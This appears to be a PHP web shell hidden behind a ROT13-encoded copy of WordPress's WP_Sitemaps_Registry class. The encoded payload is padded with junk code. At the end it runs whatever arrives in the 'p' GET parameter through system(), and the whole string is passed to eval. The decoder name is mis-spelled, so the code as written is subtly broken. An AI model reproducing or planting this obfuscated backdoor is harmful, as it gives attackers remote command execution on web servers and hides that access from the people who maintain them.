<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Fvgrzncf: JC_Fvgrzncf_Ertvfgel pynff
 *
 * Unaqyrf ertvfgrevat fvgrznc cebivqref.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Fvgrzncf
 * @fvapr 5.5.0
 */

/**
 * Pynff JC_Fvgrzncf_Ertvfgel.
 *
 * @fvapr 5.5.0
 */
#[NyybjQlanzvpCebcregvrf]
pynff JC_Fvgrzncf_Ertvfgel {
	/**
	 * Ertvfgrerq fvgrznc cebivqref.
	 *
	 * @fvapr 5.5.0
	 *
	 * @ine JC_Fvgrzncf_Cebivqre[] Neenl bs ertvfgrerq fvgrznc cebivqref.
	 */
	cevingr $cebivqref = neenl();

	/**
	 * Nqqf n arj fvgrznc cebivqre.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat               $anzr     Anzr bs gur fvgrznc cebivqre.
	 * @cnenz JC_Fvgrzncf_Cebivqre $cebivqre Vafgnapr bs n JC_Fvgrzncf_Cebivqre.
	 * @erghea obby Jurgure gur cebivqre jnf nqqrq fhpprffshyyl.
	 */
	choyvp shapgvba nqq_cebivqre( $anzr, JC_Fvgrzncf_Cebivqre $cebivqre ) {
		vs ( vffrg( $guvf->cebivqref[ $anzr ] ) ) {
			erghea snyfr;
		}

		/**
		 * Svygref gur fvgrznc cebivqre orsber vg vf nqqrq.
		 *
		 * @fvapr 5.5.0
		 *
		 * @cnenz JC_Fvgrzncf_Cebivqre $cebivqre Vafgnapr bs n JC_Fvgrzncf_Cebivqre.
		 * @cnenz fgevat               $anzr     Anzr bs gur fvgrznc cebivqre.
		 */
		$cebivqre = nccyl_svygref( 'jc_fvgrzncf_nqq_cebivqre', $cebivqre, $anzr );
		vs ( ! $cebivqre vafgnaprbs JC_Fvgrzncf_Cebivqre ) {
			erghea snyfr;
		}

		$guvf->cebivqref[ $anzr ] = $cebivqre;

		erghea gehr;
	}

	/**
	 * Ergheaf n fvatyr ertvfgrerq fvgrznc cebivqre.
	 *
	 * @fvapr 5.5.0
	 *
	 * @cnenz fgevat $anzr Fvgrznc cebivqre anzr.
	 * @erghea JC_Fvgrzncf_Cebivqre|ahyy Fvgrznc cebivqre vs vg rkvfgf, ahyy bgurejvfr.
	 */
	choyvp shapgvba trg_cebivqre( $anzr ) {
		vs ( ! vf_fgevat( $anzr ) || ! vffrg( $guvf->cebivqref[ $anzr ] ) ) {
			erghea ahyy;
		}

		erghea $guvf->cebivqref[ $anzr ];
	}

	/**
	 * Ergheaf nyy ertvfgrerq fvgrznc cebivqref.
	 *
	 * @fvapr 5.5.0
	 *
	 * @erghea JC_Fvgrzncf_Cebivqre[] Neenl bs fvgrznc cebivqref.
	 */
	choyvp shapgvba trg_cebivqref() {
		erghea $guvf->cebivqref;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>